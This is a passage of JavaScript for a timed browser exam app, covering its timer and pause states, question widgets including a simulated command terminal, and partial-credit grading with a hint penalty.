    if (S.tm.remaining <= 0) { S.tm.remaining = 0; renderTimer(); endByTimeout(); return; }
    renderTimer();
  }
  function startExamTimer() {
    S.tm.remaining = CFG.minutes * 60;
    setTimerState("RUNNING");
    if (!S.tm.iv) S.tm.iv = setInterval(tick, 1000);
  }
  function endByTimeout() {
    setTimerState("ENDED");
    showResults("Time ran out. Exercises you never answered are excluded from the score.");
  }

  /* ---------- play order (terminals stay on fixed, non-adjacent slots) ---------- */
  function buildOrder() {
    var n = EXS.length, order = new Array(n), free = [], i;
    for (i = 0; i < n; i++) free.push(i);
    var fixedIdx = [];
    EXS.forEach(function (ex, idx) {
      if (ex.slot) { order[ex.slot - 1] = idx; fixedIdx.push(idx); }
    });
    free = free.filter(function (p) { return order[p] === undefined; });
    var rest = shuffle(EXS.map(function (e, idx) { return idx; }).filter(function (idx) { return fixedIdx.indexOf(idx) === -1; }));
    var spots = shuffle(free);
    for (i = 0; i < rest.length; i++) order[spots[i]] = rest[i];
    S.order = order;
  }

  /* ---------- score display ---------- */
  function renderScore() {
    var el = $id("h-score");
    if (!el) return;
    var pct = S.answeredN ? Math.round((S.score / S.answeredN) * 100) : 0;
    el.innerHTML = '<span class="hlab">Score</span> <strong>' + (Math.round(S.score * 10) / 10).toFixed(1) + " / " + S.answeredN + "</strong> <span class='dim'>(" + pct + "%)</span>";
  }
  function renderTimer() {
    var el = $id("h-timer");
    if (!el) return;
    var t = fmtTime(S.tm.remaining), cls = "timerbox", txt = "";
    if (S.tm.state === "RUNNING") { cls += " state-run"; txt = "&#9654; Running &mdash; " + t; }
    else if (S.tm.state === "PAUSED_MANUAL") { cls += " state-manual"; txt = "&#9208; Paused &mdash; manual (press Resume)"; }
    else if (S.tm.state === "PAUSED_AUTO_CHECK") { cls += " state-auto"; txt = "&#9208; Paused &mdash; reviewing feedback (resumes on Next)"; }
    else if (S.tm.state === "ENDED") { cls += " state-ended"; txt = "&#9633; Ended"; }
    else { cls += " state-run"; txt = "&#9654; " + t; }
    el.className = cls;
    el.innerHTML = txt;
  }
  function renderReduced() {
    var el = $id("reduced-timer");
    if (!el) return;
    el.innerHTML = "&#9201; Terminal time left in this exercise: <strong>" + fmtTime(S.reduced.left) + "</strong> (of " + fmtTime(S.reduced.total) + "). When it reaches 0 the exercise is graded as it stands.";
  }

  /* ---------- header ---------- */
  function makeHeader() {
    var hd = h("header", "exhdr");
    hd.id = "exhdr";
    hd.innerHTML =
      '<div class="hgrp"><span class="hlab">Exercise</span> <strong id="h-count"></strong></div>' +
      '<div class="hgrp"><span class="badge sev-' + CFG.sevClass + '">' + CFG.sevIcon + " " + CFG.sevName + "</span></div>" +
      '<div class="hgrp"><span id="h-timer" class="timerbox state-run" aria-live="polite"></span></div>' +
      '<div class="hgrp" id="h-score"></div>' +
      '<div class="hgrp hbtns">' +
      '<button type="button" class="btn ghost" id="b-hint">Hint (&minus;10%)</button>' +
      '<button type="button" class="btn ghost" id="b-pause">Pause</button>' +
      '<button type="button" class="btn ghost" id="b-skip">Skip</button>' +
      '<button type="button" class="btn ghost" id="b-finish">Finish</button>' +
      "</div>";
    hd.querySelector("#b-hint").addEventListener("click", onHint);
    hd.querySelector("#b-pause").addEventListener("click", onPause);
    hd.querySelector("#b-skip").addEventListener("click", onSkip);
    hd.querySelector("#b-finish").addEventListener("click", onFinishButton);
    return hd;
  }
  function updateHeader() {
    var c = $id("h-count");
    if (c && S.cur) c.textContent = (S.pos + 1) + " of " + S.order.length;
    var skip = $id("b-skip"), hint = $id("b-hint");
    if (skip) skip.disabled = !!(S.cur && S.cur.graded);
    if (hint) {
      var used = S.cur && S.hints[S.cur.ex.id] && S.hints[S.cur.ex.id].used;
      hint.disabled = !!used || !!(S.cur && S.cur.graded);
    }
  }

  /* ---------- intro ---------- */
  function renderIntro() {
    S.screen = "intro";
    var root = $id("app");
    root.innerHTML = "";
    var wrap = h("div", "intro");
    wrap.innerHTML = INTROD.html;
    var bar = h("div", "startbar");
    var btn = h("button", "btn primary big");
    btn.id = "start-btn"; btn.type = "button";
    btn.textContent = "Start the exam";
    btn.addEventListener("click", startExam);
    bar.appendChild(btn);
    wrap.appendChild(bar);
    root.appendChild(wrap);
    window.scrollTo(0, 0);
  }

  function startExam() {
    S.attempt++; S.reported = false;
    S.answered = {}; S.skipped = {};
    S.score = 0; S.answeredN = 0; S.hints = {};
    S.pos = 0; S.reviewFlag = false; S.cur = null;
    S.reduced = { left: 0, total: 0 };
    S.tm.manualMs = 0; S.tm.autoMs = 0;
    if (S.tm.iv) { clearInterval(S.tm.iv); S.tm.iv = null; }
    S.tm.state = "IDLE";
    buildOrder();
    S.screen = "exam";
    startExamTimer();
    renderExamFrame();
    renderCurrent();
  }

  /* ---------- exam frame ---------- */
  function renderExamFrame() {
    var root = $id("app");
    root.innerHTML = "";
    root.appendChild(makeHeader());
    var main = h("div");
    main.id = "exam-main";
    root.appendChild(main);
  }

  function renderCurrent() {
    var main = $id("exam-main");
    main.innerHTML = "";
    var exIdx = S.order[S.pos];
    var ex = EXS[exIdx];
    var fromReview = S.reviewFlag;
    S.reviewFlag = false;
    S.cur = { ex: ex, idx: exIdx, graded: false, credit: 0, items: null, answerHtml: "", fromReview: fromReview, widget: null };
    if (!S.hints[ex.id]) S.hints[ex.id] = { used: false, shown: false };
    S.reduced = ex.ix.reduced ? { left: ex.ix.reduced, total: ex.ix.reduced } : { left: 0, total: 0 };

    var card = h("div", "excard");

    /* SCENARIO block (collapsible) */
    var sc = h("section", "blk blk-scenario");
    var scHead = h("div", "blk-h");
    scHead.innerHTML = '<span class="bicon" aria-hidden="true">&#9636;</span> SCENARIO';
    var caret = h("button", "minicaret");
    caret.type = "button";
    caret.setAttribute("aria-expanded", "true");
    caret.innerHTML = "&#9662; hide scenario";
    scHead.appendChild(caret);
    var sum = h("button", "sumline");
    sum.type = "button";
    sum.setAttribute("aria-expanded", "true");
    sum.innerHTML = '<span class="sumtxt">' + ex.summary + '</span><span class="caret">&#9662; collapse</span>';
    var scbody = h("div", "blk-body");
    scbody.innerHTML = ex.scenario;
    function setScenarioOpen(open) {
      scbody.style.display = open ? "" : "none";
      caret.setAttribute("aria-expanded", String(open));
      caret.innerHTML = open ? "&#9662; hide scenario" : "&#9656; show scenario";
      sum.style.display = open ? "none" : "";
    }
    caret.addEventListener("click", function () { setScenarioOpen(scbody.style.display === "none"); });
    sum.addEventListener("click", function () { setScenarioOpen(true); });
    sc.appendChild(scHead);
    sc.appendChild(sum);
    sc.appendChild(scbody);
    card.appendChild(sc);

    /* QUESTION block */
    var q = h("section", "blk blk-question");
    q.innerHTML = '<div class="blk-h"><span class="bicon" aria-hidden="true">&#10067;</span> QUESTION</div>' +
      '<div class="blk-body"><p class="qtext">' + ex.question + "</p></div>";
    card.appendChild(q);

    /* YOUR ANSWER block */
    var ans = h("section", "blk blk-answer");
    ans.innerHTML = '<div class="blk-h"><span class="bicon" aria-hidden="true">&#9998;</span> YOUR ANSWER</div>';
    var ansBody = h("div", "blk-body");
    S.cur.widget = buildWidget(ex);
    ansBody.appendChild(S.cur.widget.node);
    ans.appendChild(ansBody);
    card.appendChild(ans);

    /* hint panel */
    var hintPanel = h("div");
    hintPanel.id = "hint-panel";
    if (S.hints[ex.id].shown) hintPanel.innerHTML = '<div class="hintbox"><strong>Hint:</strong> ' + esc(ex.hint) + "</div>";
    card.appendChild(hintPanel);

    /* footer controls */
    var foot = h("div", "stepctrl");
    if (ex.ix.reduced) {
      foot.appendChild(h("span", "reducednote", ""));
      foot.lastChild.id = "reduced-timer";
    }
    var chk = h("button", "btn primary");
    chk.id = "b-check"; chk.type = "button"; chk.textContent = "Check";
    chk.addEventListener("click", onCheck);
    var nxt = h("button", "btn green");
    nxt.id = "b-next"; nxt.type = "button"; nxt.textContent = "Next";
    nxt.disabled = true;
    nxt.addEventListener("click", onNext);
    foot.appendChild(chk);
    foot.appendChild(nxt);
    card.appendChild(foot);

    /* feedback container (below the three blocks) */
    var fb = h("div");
    fb.id = "fb";
    fb.className = "fb";
    fb.style.display = "none";
    fb.addEventListener("click", function (ev) {
      var t = ev.target;
      if (t && t.classList && t.classList.contains("copybtn")) {
        var pre = t.parentNode.querySelector("pre.code");
        if (pre) copyText(pre.textContent, t);
      }
    });
    card.appendChild(fb);

    main.appendChild(card);

    highlightCodeIn(card);
    bindLogFilters(card);
    renderTimer();
    renderScore();
    updateHeader();
    if (ex.ix.reduced) renderReduced();
    window.scrollTo(0, 0);
  }

  function copyText(text, btn) {
    var done = function () { if (btn) { var o = btn.textContent; btn.textContent = "Copied"; setTimeout(function () { btn.textContent = o; }, 1200); } };
    try {
      if (navigator.clipboard && navigator.clipboard.writeText) { navigator.clipboard.writeText(text).then(done, done); return; }
    } catch (e) { /* fall through */ }
    try {
      var ta = document.createElement("textarea");
      ta.value = text; ta.style.position = "fixed"; ta.style.opacity = "0";
      document.body.appendChild(ta); ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
    } catch (e2) { /* clipboard unavailable */ }
    done();
  }

  function onHint() {
    if (!S.cur || S.cur.graded) return;
    var st = S.hints[S.cur.ex.id];
    if (!st) st = S.hints[S.cur.ex.id] = { used: false, shown: false };
    if (st.used) return;
    st.used = true; st.shown = true;
    var p = $id("hint-panel");
    if (p) p.innerHTML = '<div class="hintbox"><strong>Hint:</strong> ' + esc(S.cur.ex.hint) + "</div>";
    updateHeader();
    /* Hint never changes the timer state and never pauses the clock. */
  }

  function onPause() {
    if (S.screen !== "exam" && S.screen !== "review") return;
    if (S.tm.state === "RUNNING" || S.tm.state === "PAUSED_AUTO_CHECK") {
      S.tm.prev = S.tm.state;
      setTimerState("PAUSED_MANUAL");
      showPauseOverlay();
    }
  }
  function showPauseOverlay() {
    removePauseOverlay();
    var ov = h("div", "overlay");
    ov.id = "pause-overlay";
    ov.innerHTML = '<div class="overlaybox"><h2>&#9208; Paused</h2><p>The timer is stopped. The exercise is hidden so you cannot read or answer it while you take a break.</p><button type="button" class="btn primary big" id="b-resume">Resume</button></div>';
    document.body.appendChild(ov);
    $id("b-resume").addEventListener("click", onResume);
  }
  function removePauseOverlay() {
    var ov = $id("pause-overlay");
    if (ov && ov.parentNode) ov.parentNode.removeChild(ov);
  }
  function onResume() {
    if (S.tm.state !== "PAUSED_MANUAL") return;
    removePauseOverlay();
    setTimerState(S.tm.prev === "PAUSED_AUTO_CHECK" ? "PAUSED_AUTO_CHECK" : "RUNNING");
  }

  function onFinishButton() {
    if (S.screen !== "exam" && S.screen !== "review") return;
    removePauseOverlay();
    if (S.screen === "review") { showResults(null); return; } /* Finish on the review screen = submit now */
    toReviewOrResults();
  }

  function toReviewOrResults() {
    if (Object.keys(S.skipped).length > 0) renderReview();
    else showResults(null);
  }

  /* ---------- widgets ---------- */
  function buildWidget(ex) {
    if (ex.kind === "qcm" || ex.kind === "multi") return buildChoice(ex, ex.kind === "multi");
    if (ex.kind === "dnd") return buildDnd(ex);
    if (ex.kind === "order") return buildOrderWidget(ex);
    if (ex.kind === "fill") return buildFill(ex);
    if (ex.kind === "term") return buildTerm(ex);
    if (ex.kind === "branch") return buildBranch(ex);
    return buildChoice(ex, false);
  }

  function buildChoice(ex, multi) {
    var ix = ex.ix;
    var opts = shuffle(ix.opts);
    var sel = {};
    var box = h("div", "opts");
    opts.forEach(function (o, i) {
      var letter = String.fromCharCode(65 + i);
      var b = h("button", "opt");
      b.type = "button";
      b.setAttribute("aria-pressed", "false");
      b.innerHTML = '<span class="okey">' + letter + '.</span><span class="otxt">' + o.h + "</span>" + (multi ? '<span class="obox" aria-hidden="true"></span>' : "");
      b.addEventListener("click", function () {
        if (S.cur && S.cur.graded) return;
        if (multi) {
          sel[o.id] = !sel[o.id];
          b.classList.toggle("sel", !!sel[o.id]);
          b.setAttribute("aria-pressed", String(!!sel[o.id]));
        } else {
          sel = {}; sel[o.id] = true;
          Array.prototype.forEach.call(box.children, function (c) { c.classList.remove("sel"); c.setAttribute("aria-pressed", "false"); });
          b.classList.add("sel");
          b.setAttribute("aria-pressed", "true");
        }
      });
      box.appendChild(b);
    });
    return {
      node: box,
      get: function () { return Object.keys(sel).filter(function (k) { return sel[k]; }); },
      lock: function () { Array.prototype.forEach.call(box.children, function (c) { c.disabled = true; }); }
    };
  }

  function buildDnd(ex) {
    var ix = ex.ix;
    var wrap = h("div", "dndwrap");
    var zname = {};
    ix.zones.forEach(function (z) { zname[z.id] = z.h; });
    var bankLabel = h("div", "bank-label", "Drag each item into a zone (or click an item, then click a zone):");
    var bank = h("div", "bank");
    bank.setAttribute("aria-label", "Items to place");
    var zonesLabel = h("div", "zones-label", "Drop zones:");
    var zones = h("div", "zones");
    var placement = {}, picked = null, itemEls = {};
    wrap.appendChild(bankLabel); wrap.appendChild(bank);
    wrap.appendChild(zonesLabel); wrap.appendChild(zones);

    function refresh() {
      Array.prototype.forEach.call(zones.children, function (z) {
        var list = z.querySelector(".zitems");
        list.innerHTML = "";
        var any = false;
        Object.keys(placement).forEach(function (itemId) {
          if (placement[itemId] === z.getAttribute("data-zone")) {
            any = true;
            list.appendChild(itemEls[itemId]);
          }
        });
        var empty = z.querySelector(".zempty");
        if (empty) empty.style.display = any ? "none" : "";
      });
      Array.prototype.forEach.call(bank.children, function (c) {
        if (c.getAttribute && c.getAttribute("data-item") && placement[c.getAttribute("data-item")]) {
          bank.removeChild(c);
        }
      });
    }
    function place(itemId, zoneId) {
      if (!itemId || !zoneId) return;
      placement[itemId] = zoneId;
      if (picked === itemId) picked = null;
      refresh();
    }
    ix.items.forEach(function (it) {
      var b = h("button", "ditem");
      b.type = "button";
      b.setAttribute("draggable", "true");
      b.setAttribute("data-item", it.id);
      b.innerHTML = it.h;
      b.addEventListener("dragstart", function (ev) {
        if (S.cur && S.cur.graded) { ev.preventDefault(); return; }
        try { ev.dataTransfer.setData("text/plain", it.id); } catch (e) { /* older engines */ }
      });
      b.addEventListener("click", function () {
        if (S.cur && S.cur.graded) return;
        if (placement[it.id]) { /* return to bank */
          delete placement[it.id];
          bank.appendChild(b);
          refresh();
        } else {
          if (picked) { var prev = itemEls[picked]; if (prev) prev.classList.remove("picked"); }
          picked = it.id;
          b.classList.add("picked");
        }
      });
      itemEls[it.id] = b;
      bank.appendChild(b);
    });
    ix.zones.forEach(function (z) {
      var zd = h("div", "zone");
      zd.setAttribute("data-zone", z.id);
      /* Keyboard parity for click-to-place: a zone is a focusable button-like
         target; Enter or Space drops the picked item. */
      zd.setAttribute("role", "button");
      zd.setAttribute("tabindex", "0");
      zd.setAttribute("aria-label", "Drop zone: " + z.h.replace(/<[^>]+>/g, ""));
      zd.innerHTML = '<div class="zlabel">' + z.h + '</div><div class="zitems"></div><div class="zempty">Drop here</div>';
      zd.addEventListener("dragover", function (ev) { ev.preventDefault(); zd.classList.add("droptarget"); });
      zd.addEventListener("dragleave", function () { zd.classList.remove("droptarget"); });
      zd.addEventListener("drop", function (ev) {
        ev.preventDefault();
        zd.classList.remove("droptarget");
        if (S.cur && S.cur.graded) return;
        var itemId = null;
        try { itemId = ev.dataTransfer.getData("text/plain"); } catch (e) { /* older engines */ }
        if (!itemId) itemId = picked;
        place(itemId, z.id);
      });
      zd.addEventListener("click", function () {
        if (S.cur && S.cur.graded) return;
        if (picked) place(picked, z.id);
      });
      zd.addEventListener("keydown", function (ev) {
        if (ev.key !== "Enter" && ev.key !== " " && ev.key !== "Spacebar") return;
        if (S.cur && S.cur.graded) return;
        ev.preventDefault();
        if (picked) place(picked, z.id);
      });
      zones.appendChild(zd);
    });
    return {
      node: wrap,
      get: function () { return placement; },
      lock: function () {
        Array.prototype.forEach.call(wrap.querySelectorAll("button"), function (b) { b.disabled = true; });
      }
    };
  }

  function buildOrderWidget(ex) {
    var ix = ex.ix;
    var list = h("div", "olist");
    var labels = {};
    ix.items.forEach(function (it) { labels[it.id] = it.h; });
    var cur = shuffle(ix.items.map(function (x) { return x.id; }));
    function mv2(i, j) {
      if (S.cur && S.cur.graded) return;
      if (i === j || i < 0 || j < 0 || i >= cur.length || j >= cur.length) return;
      var t = cur[i]; cur[i] = cur[j]; cur[j] = t;
      render();
    }
    function render() {
      list.innerHTML = "";
      cur.forEach(function (id, i) {
        var row = h("div", "orow");
        row.setAttribute("draggable", "true");
        row.setAttribute("data-oid", id);
        row.innerHTML = '<span class="okey">' + (i + 1) + '.</span><span class="otxt">' + labels[id] + "</span>" +
          '<span class="obtns">' +
          '<button type="button" class="mini" aria-label="Move up" data-mv="up">&#8593;</button>' +
          '<button type="button" class="mini" aria-label="Move down" data-mv="down">&#8595;</button></span>';
        row.querySelector('[data-mv="up"]').addEventListener("click", function () { mv2(i, i - 1); });
        row.querySelector('[data-mv="down"]').addEventListener("click", function () { mv2(i, i + 1); });
        row.addEventListener("dragstart", function (ev) { try { ev.dataTransfer.setData("text/plain", String(i)); } catch (e) { /* older engines */ } });
        row.addEventListener("dragover", function (ev) { ev.preventDefault(); });
        row.addEventListener("drop", function (ev) {
          ev.preventDefault();
          var from = parseInt(ev.dataTransfer.getData("text/plain"), 10);
          if (!isNaN(from)) mv2(from, i);
        });
        list.appendChild(row);
      });
    }
    render();
    return {
      node: list,
      get: function () { return cur.slice(); },
      lock: function () { Array.prototype.forEach.call(list.querySelectorAll("button"), function (b) { b.disabled = true; }); }
    };
  }

  function buildFill(ex) {
    var ix = ex.ix;
    var wrap = h("div", "fillwrap");
    var sent = h("div", "fillsent");
    var bankLabel = h("div", "bank-label", "Word bank (click a word to fill the next empty blank):");
    var bank = h("div", "bank");
    var slots = ix.slots.map(function () { return null; });
    var chipOf = {};
    function renderSentence() {
      sent.innerHTML = "";
      ix.segs.forEach(function (sg, i) {
        sent.appendChild(h("span", null, sg));
        if (i < ix.slots.length) {
          (function (idx) {
            var sb = h("button", "slot" + (slots[idx] ? " filled" : ""));
            sb.type = "button";
            sb.innerHTML = slots[idx] ? esc(slots[idx]) : "&nbsp;____&nbsp;";
            sb.addEventListener("click", function () {
              if (S.cur && S.cur.graded) return;
              if (slots[idx]) { bankReturn(idx); }
            });
            sent.appendChild(sb);
          })(i);
        }
      });
    }
    function renderBank() {
      bank.innerHTML = "";
      ix.bank.forEach(function (w) {
        var used = slots.indexOf(w) !== -1;
        var c = h("button", "chip");
        c.type = "button";
        c.innerHTML = esc(w);
        c.disabled = used;
        c.addEventListener("click", function () {
          if (S.cur && S.cur.graded) return;
          var target = -1;
          for (var i = 0; i < slots.length; i++) if (slots[i] === null) { target = i; break; }
          if (target === -1) return;
          slots[target] = w;
          renderSentence(); renderBank();
        });
        chipOf[w] = c;
        bank.appendChild(c);
      });
    }
    function bankReturn(idx) {
      slots[idx] = null;
      renderSentence(); renderBank();
    }
    renderSentence(); renderBank();
    wrap.appendChild(sent); wrap.appendChild(bankLabel); wrap.appendChild(bank);
    return {
      node: wrap,
      get: function () { return slots.slice(); },
      lock: function () { Array.prototype.forEach.call(wrap.querySelectorAll("button"), function (b) { b.disabled = true; }); }
    };
  }

  function normCmd(c) { return String(c).replace(/\s+/g, " ").trim().toLowerCase(); }
  function matchAll(elems, n) { for (var i = 0; i < elems.length; i++) if (!elems[i].re.test(n)) return false; return true; }
  function hitAny(list, n) { for (var i = 0; i < list.length; i++) if (list[i].re.test(n)) return true; return false; }

  function buildTerm(ex) {
    var ix = ex.ix;
    var wrap = h("div", "termwrap");
    if (ix.syntax) wrap.appendChild(h("div", "syntax", ix.syntax));
    if (ix.shape) wrap.appendChild(h("div", "shape", ix.shape));
    var scr = h("div", "termscr");
    scr.setAttribute("aria-label", "Simulated terminal output");
    scr.innerHTML = '<div class="tline dim">Simulation only &mdash; nothing here runs for real. Type a command, press Run or Enter to try it, then press Check to submit.</div>';
    var inline = h("div", "terminline");
    inline.innerHTML = '<span class="tprompt">' + esc(ix.prompt) + "</span>";
    var inp = h("input", "tinput");
    inp.type = "text";
    inp.setAttribute("autocomplete", "off");
    inp.setAttribute("autocapitalize", "off");
    inp.setAttribute("spellcheck", "false");
    inp.setAttribute("aria-label", "Type the command");
    var run = h("button", "btn ghost mini");
    run.type = "button"; run.textContent = "Run";
    inline.appendChild(inp); inline.appendChild(run);
    wrap.appendChild(scr); wrap.appendChild(inline);
    var lastCmd = "";
    function runCmd() {
      var v = inp.value;
      if (!v.trim()) return;
      lastCmd = v;
      var line = h("div", "tline");
      line.innerHTML = '<span class="tprompt">' + esc(ix.prompt) + "</span> " + esc(v);
      scr.appendChild(line);
      var n = normCmd(v);
      if (matchAll(ix.elems, n) && !hitAny(ix.forbidden || [], n)) {
        (ix.out && ix.out.length ? ix.out : ["The command completed successfully."]).forEach(function (l) {
          scr.appendChild(h("div", "tline out", l));
        });
      } else if (hitAny(ix.forbidden || [], n)) {
        scr.appendChild(h("div", "tline warn", ix.warn || "Careful: this command changes or destroys data. It will be marked wrong if you submit it."));
      } else {
        scr.appendChild(h("div", "tline dim", ix.miss || "The command did not match the expected action. Check the tool, the options and the target."));
      }
      scr.scrollTop = scr.scrollHeight;
    }
    run.addEventListener("click", runCmd);
    inp.addEventListener("keydown", function (ev) { if (ev.key === "Enter") { ev.preventDefault(); runCmd(); } });
    return {
      node: wrap,
      get: function () { return inp.value.trim() ? inp.value : lastCmd; },
      lock: function () { inp.disabled = true; run.disabled = true; }
    };
  }

  function buildBranch(ex) {
    var ix = ex.ix;
    var wrap = h("div", "branchwrap");
    var area = h("div", "steparea");
    var ctrl = h("div", "branchctrl");
    var step = 0;
    var chosen = new Array(ix.steps.length);
    for (var i0 = 0; i0 < ix.steps.length; i0++) chosen[i0] = null;
    function optLabel(st, id) {
      for (var i = 0; i < st.opts.length; i++) if (st.opts[i].id === id) return st.opts[i].h;
      return "(no answer)";
    }
    function renderStep() {
      area.innerHTML = "";
      var st = ix.steps[step];
      area.appendChild(h("div", "steplab", "STEP " + (step + 1) + " OF " + ix.steps.length));
      var opts = shuffle(st.opts);
      opts.forEach(function (o, i) {
        var b = h("button", "opt");
        b.type = "button";
        b.innerHTML = '<span class="okey">' + String.fromCharCode(65 + i) + '.</span><span class="otxt">' + o.h + "</span>";
        b.addEventListener("click", function () {
          if (S.cur && S.cur.graded) return;
          chosen[step] = o.id;
          Array.prototype.forEach.call(area.querySelectorAll(".opt"), function (c) { c.classList.remove("sel"); });
          b.classList.add("sel");
        });
        area.appendChild(b);
      });
      ctrl.innerHTML = "";
      if (step < ix.steps.length - 1) {
        var cb = h("button", "btn primary");
        cb.type = "button"; cb.textContent = "Confirm & continue";
        cb.addEventListener("click", function () {
          if (chosen[step] == null) {
            var f = h("span", "flash", "Choose an option first.");
            ctrl.appendChild(f);
            setTimeout(function () { if (f.parentNode) f.parentNode.removeChild(f); }, 1600);
            return;
          }
          step++;
          renderStep();
        });
        ctrl.appendChild(cb);
        ctrl.appendChild(h("span", "dim", "Confirming a step does not pause the timer."));
      } else {
        ctrl.appendChild(h("span", "dim", "Final step. Now press Check to grade the whole decision chain."));
      }
    }
    renderStep();
    wrap.appendChild(area); wrap.appendChild(ctrl);
    return {
      node: wrap,
      get: function () { return chosen; },
      lock: function () { Array.prototype.forEach.call(wrap.querySelectorAll("button"), function (b) { b.disabled = true; }); }
    };
  }

  function smoothScroll(el) {
    var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    try { el.scrollIntoView({ behavior: reduce ? "auto" : "smooth", block: "nearest" }); }
    catch (e) { el.scrollIntoView(); }
  }

  /* ---------- check + grading ---------- */
  function flashCheckMsg(msg) {
    var foot = $id("b-check") && $id("b-check").parentNode;
    if (!foot) return;
    var old = $id("check-flash");
    if (old && old.parentNode) old.parentNode.removeChild(old);
    var f = h("span", "flash", esc(msg));
    f.id = "check-flash";
    foot.appendChild(f);
    setTimeout(function () { if (f.parentNode) f.parentNode.removeChild(f); }, 2200);
  }
  function isEmptyAnswer(ex) {
    var v = S.cur.widget.get();
    if (ex.kind === "qcm" || ex.kind === "multi") return v.length === 0;
    if (ex.kind === "dnd") {
      var keys = Object.keys(v); for (var i = 0; i < keys.length; i++) if (v[keys[i]]) return false; return true;
    }
    if (ex.kind === "order") return false; /* items are always placed */
    if (ex.kind === "fill") { for (var j = 0; j < v.length; j++) if (v[j]) return false; return true; }
    if (ex.kind === "term") return !String(v || "").trim();
    if (ex.kind === "branch") { for (var k = 0; k < v.length; k++) if (v[k]) return false; return true; }
    return false;
  }
  function onCheck() {
    if (!S.cur || S.cur.graded) return;
    /* An empty submission is not an answer: nudge instead of locking the
       exercise at zero. The timer keeps running; no pause is triggered. */
    if (isEmptyAnswer(S.cur.ex)) {
      flashCheckMsg("Choose an answer first, or press Skip to move on.");
      return;
    }
    /* First action, before feedback renders: enter the Check-triggered auto-pause. */
    if (S.tm.state === "RUNNING" || S.tm.state === "IDLE") setTimerState("PAUSED_AUTO_CHECK");
    gradeCurrent();
  }

  function gradeCurrent() {
    var ex = S.cur.ex, ix = ex.ix, w = S.cur.widget;
    var items = [], N = 1, credit = 0, answerHtml = "";
    if (ex.kind === "qcm" || ex.kind === "multi") {
      var sel = w.get(), corr = ix.correct;
      N = corr.length;
      credit = scoreExercise(sel, corr);
      ix.opts.forEach(function (o) {
        var isC = corr.indexOf(o.id) !== -1, isSel = sel.indexOf(o.id) !== -1;
        if (isC) items.push({ h: o.h, st: isSel ? "ok" : "missed" });
        else if (isSel) items.push({ h: o.h, st: "wrong" });
      });
      answerHtml = "<ul class='anslist'>" + ix.opts.filter(function (o) { return corr.indexOf(o.id) !== -1; })
        .map(function (o) { return "<li>" + o.h + "</li>"; }).join("") + "</ul>";
    } else if (ex.kind === "dnd") {
      var pl = w.get();
      var zname = {};
      ix.zones.forEach(function (z) { zname[z.id] = z.h; });
      N = ix.items.length;
      var H1 = 0, W1 = 0;
      ix.items.forEach(function (it) {
        var pz = pl[it.id];
        if (!pz) items.push({ h: it.h + " &rarr; <em>not placed</em>", st: "missed" });
        else if (pz === it.z) { H1++; items.push({ h: it.h + " &rarr; " + zname[it.z], st: "ok" }); }
        else { W1++; items.push({ h: it.h + " &rarr; you placed it in &ldquo;" + zname[pz] + "&rdquo;", st: "wrong" }); }
      });
      credit = Math.max(0, (H1 - W1) / N);
      answerHtml = "<ul class='anslist'>" + ix.items.map(function (it) {
        return "<li>" + it.h + " &rarr; <strong>" + zname[it.z] + "</strong></li>";
      }).join("") + "</ul>";
    } else if (ex.kind === "order") {
      var cur = w.get();
      N = ix.items.length;
      var H2 = 0, W2 = 0;
      var lbl = {};
      ix.items.forEach(function (it) { lbl[it.id] = it.h; });
      cur.forEach(function (id, i) {
        if (id === ix.items[i].id) { H2++; items.push({ h: "Position " + (i + 1) + ": " + ix.items[i].h, st: "ok" }); }
        else { W2++; items.push({ h: "Position " + (i + 1) + ": you placed &ldquo;" + lbl[id] + "&rdquo; &mdash; correct: &ldquo;" + ix.items[i].h + "&rdquo;", st: "wrong" }); }
      });
      credit = Math.max(0, (H2 - W2) / N);
      answerHtml = "<ol class='anslist'>" + ix.items.map(function (it) { return "<li>" + it.h + "</li>"; }).join("") + "</ol>";
    } else if (ex.kind === "fill") {
      var fills = w.get();
      N = ix.slots.length;
      var H3 = 0, W3 = 0;
      ix.slots.forEach(function (a, i) {
        var got = fills[i];
        if (!got) items.push({ h: "Blank " + (i + 1) + " (" + esc(ix.slotNames && ix.slotNames[i] ? ix.slotNames[i] : "blank") + "): left empty &mdash; correct: <strong>" + esc(a) + "</strong>", st: "missed" });
        else if (got.toLowerCase() === a.toLowerCase()) { H3++; items.push({ h: "Blank " + (i + 1) + ": " + esc(got), st: "ok" }); }
        else { W3++; items.push({ h: "Blank " + (i + 1) + ': you wrote &ldquo;' + esc(got) + "&rdquo; &mdash; correct: <strong>" + esc(a) + "</strong>", st: "wrong" }); }
      });
      credit = Math.max(0, (H3 - W3) / N);
      answerHtml = "<p>" + ix.slots.map(function (a, i) { return "Blank " + (i + 1) + ": <strong>" + esc(a) + "</strong>"; }).join(" &middot; ") + "</p>";
    } else if (ex.kind === "term") {
      var n = normCmd(w.get());
      var H4 = 0, W4 = 0;
      ix.elems.forEach(function (e) {
        var ok = e.re.test(n);
        if (ok) H4++;
        items.push({ h: e.h, st: ok ? "ok" : "missed" });
      });
      (ix.forbidden || []).forEach(function (f) {
        if (f.re.test(n)) { W4++; items.push({ h: f.h, st: "wrong" }); }
      });
      N = ix.elems.length;
      credit = Math.max(0, (H4 - W4) / N);
      answerHtml = '<div class="codeblock"><pre class="code">' + esc(ix.canon) + '</pre><button type="button" class="btn mini copybtn">Copy</button></div>' +
        "<ul class='anslist'>" + ix.elems.map(function (e) { return "<li>" + esc(e.h) + "</li>"; }).join("") + "</ul>" +
        (ix.canonNote || "");
    } else if (ex.kind === "branch") {
      var ch = w.get();
      N = ix.steps.length;
      var H5 = 0, W5 = 0;
      function olbl(st, id) { for (var i = 0; i < st.opts.length; i++) if (st.opts[i].id === id) return st.opts[i].h; return "(no answer)"; }
      ix.steps.forEach(function (st, i) {
        var ok = ch[i] === st.correct;
        if (ok) H5++; else W5++;
        items.push({ h: "Step " + (i + 1) + ": " + (ok ? "you chose the best option" : 'you chose &ldquo;' + olbl(st, ch[i]) + "&rdquo; &mdash; best: &ldquo;" + olbl(st, st.correct) + "&rdquo;"), st: ok ? "ok" : "wrong" });
      });
      credit = Math.max(0, (H5 - W5) / N);
      answerHtml = "<ol class='anslist'>" + ix.steps.map(function (st) {
        return "<li>" + st.q + " &rarr; <strong>" + olbl(st, st.correct) + "</strong></li>";
      }).join("") + "</ol>";
    }

    var hintUsed = !!(S.hints[ex.id] && S.hints[ex.id].used);
    var creditFinal = Math.max(0, credit - (hintUsed ? 0.10 : 0));
    if (!(ex.id in S.answered)) S.answeredN++;
    S.score += creditFinal;
